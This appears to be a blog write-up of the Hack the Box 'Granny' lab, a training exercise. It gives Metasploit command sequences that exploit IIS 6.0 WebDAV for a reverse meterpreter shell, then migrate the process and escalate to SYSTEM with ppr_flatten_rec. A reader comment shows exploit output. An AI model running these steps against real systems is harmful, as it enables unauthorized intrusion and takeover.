@@ -1,0 +1,355 @@
+
+								
+																		Hack the Box Challenge: Granny Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on April 2, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello friends!! Today we are going to solve another CTF challenge “Granny” which is categories as retired lab presented by Hack the Box for making online penetration practices. Challenges in this lab are not hard to complete although they are like a brain teaser for the beginner as well as for expert penetration tester too. 
+Level: Intermediate
+Task: find user.txt and root.txt file on the victim’s machine.
+Since these labs are online accessible therefore they have static IP. The IP of Granny is 10.10.10.15 so let’s initiate with nmap port enumeration.
+
+		
+		
+			
+			
+			
+			
+nmap -A 10.10.10.15
+			
+				
+					
+				
+					1
+				
+						nmap -A 10.10.10.15
+					
+				
+			
+		
+
+From the given below image, you can observe we found port 80 is open and Microsoft IIS 6.0 is running in victim’s network.
+
+Significant port 80 is open in the victim’s network we preferred to explore his IP in the browser and resulting web page is shown below.
+
+Since we know Microsoft IIS httpd 6.0 is running in victims system therefore when I Google I found Rapid 7 exploit for this as highlighted in given below image.
+
+Without wasting time I open a new terminal and type msfconsole for loading Metasploit framework and use module iis_webdav for exploiting targets system.
+
+		
+		
+			
+			
+			
+			
+use exploit/windows/iis/iis_webdav_upload_asp
+msf exploit(windows/iis/iis_webdav_upload_asp) &gt;set rhost 10.10.10.15
+msf exploit(windows/iis/iis_webdav_upload_asp) &gt;run
+			
+				
+					
+				
+					123
+				
+						use exploit/windows/iis/iis_webdav_upload_aspmsf exploit(windows/iis/iis_webdav_upload_asp) &gt;set rhost 10.10.10.15msf exploit(windows/iis/iis_webdav_upload_asp) &gt;run
+					
+				
+			
+		
+
+From given below image you can observe meterpreter shell session1 opened for accessing victim tty shell.
+
+Every time my meterpreter session get died therefore I go post exploitation for migrating current process into another process by executing the following module.
+
+		
+		
+			
+			
+			
+			
+use post/windows/manage/migrate
+msf post(windows/manage/migrate)&gt;set session 1
+msf post(windows/manage/migrate)&gt; run
+			
+				
+					
+				
+					123
+				
+						use post/windows/manage/migratemsf post(windows/manage/migrate)&gt;set session 1msf post(windows/manage/migrate)&gt; run
+					
+				
+			
+		
+
+Above module will migrate a Meterpreter session from one process to another. A given process PID to migrate to or the module can spawn one and migrate to that newly spawned process.
+
+Then I run a post exploit “Multi Recon Local Exploit Suggester” that suggests local meterpreter exploits that can be used for the further exploit. The exploits are recommended founded on the architecture and platform that the user has a shell opened as well as the available exploits in meterpreter.
+
+		
+		
+			
+			
+			
+			
+use post/multi/recon/local_exploit_suggester
+msf post(multi/recon/local_exploit_suggester) &gt; set session 1
+msf post(multi/recon/local_exploit_suggester) &gt; exploit
+			
+				
+					
+				
+					123
+				
+						use post/multi/recon/local_exploit_suggestermsf post(multi/recon/local_exploit_suggester) &gt; set session 1msf post(multi/recon/local_exploit_suggester) &gt; exploit
+					
+				
+			
+		
+
+Wonderful!! Exploit Suggester truly proof itself by suggesting another exploit name to which target is vulnerable. So now we will go with the last option as highlighted in the image.
+
+At this time use pprFlattenRec Local Privilege Escalation module for making unauthorized access again but as privileged user.
+
+		
+		
+			
+			
+			
+			
+use exploit/windows/local/ppr_flatten_rec
+msf exploit(windows/local/ppr_flatten_rec) &gt;set session 1
+msf exploit(windows/local/ppr_flatten_rec) &gt;set wait 20
+msf exploit(windows/local/ppr_flatten_rec) &gt; set lhost 10.10.14.6
+msf exploit(windows/local/ppr_flatten_rec) &gt; exploit
+			
+				
+					
+				
+					12345
+				
+						use exploit/windows/local/ppr_flatten_recmsf exploit(windows/local/ppr_flatten_rec) &gt;set session 1msf exploit(windows/local/ppr_flatten_rec) &gt;set wait 20msf exploit(windows/local/ppr_flatten_rec) &gt; set lhost 10.10.14.6msf exploit(windows/local/ppr_flatten_rec) &gt; exploit
+					
+				
+			
+		
+
+Nice!! It works and we got meterpreter session 2 as system user and you can check in below image.
+
+
+		
+		
+			
+			
+			
+			
+meterpreter &gt; getuid
+			
+				
+					
+				
+					1
+				
+						meterpreter &gt; getuid
+					
+				
+			
+		
+
+As we have tty shell that has system privileges now let’s complete this task my searching user.txt and root.txt flag which is hidden somewhere inside a directory.
+
+		
+		
+			
+			
+			
+			
+meterpreter &gt; ls
+			
+				
+					
+				
+					1
+				
+						meterpreter &gt; ls
+					
+				
+			
+		
+
+Here we found Document and setting let’s explore
+
+Inside C:\Document and Setting\Lakis\Desktop I found the user.txt file and used the type “filename” command for reading this file.
+
+		
+		
+			
+			
+			
+			
+cd Lakis/Desktop
+cat user.txt
+			
+				
+					
+				
+					12
+				
+						cd Lakis/Desktopcat user.txt
+					
+				
+			
+		
+
+Great!! We got our 1st flag successfully
+
+Inside C:\Document and Setting\Administrtator\Desktop I found the root.txt file and used the type “filename” command for reading this file.
+
+		
+		
+			
+			
+			
+			
+cd Administrator/Desktop
+cat root.txt
+			
+				
+					
+				
+					12
+				
+						cd Administrator/Desktopcat root.txt
+					
+				
+			
+		
+
+Great!! We got our 2nd flag successfully
+Breaching this lab was an interesting and enjoyable moment for me. It will take less time if you are aware of proper Metasploit exploits. Therefore I will give all Glory to Metasploit for making this challenge easy for me.
+Happy Hacking!!
+
+Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
+							
+								Maty August 6, 2018 at 1:48 pm							
+							
+							
+														
+							
+								Nice
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
+							
+								Mukarram January 22, 2019 at 2:17 pm							
+							
+							
+														
+							
+								msf exploit(windows/iis/iis_webdav_upload_asp) &gt; set rhost 10.10.10.15
+rhost =&gt; 10.10.10.15
+msf exploit(windows/iis/iis_webdav_upload_asp) &gt; run
+[*] Started reverse TCP handler on 10.10.14.10:4444
+[*] Checking /metasploit106997395.asp
+[*] Uploading 612556 bytes to /metasploit106997395.txt…
+[-] Upload failed on /metasploit106997395.txt [500 Internal Server Error]
+[*] Exploit completed, but no session was created.
+Any idea of above failed?
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
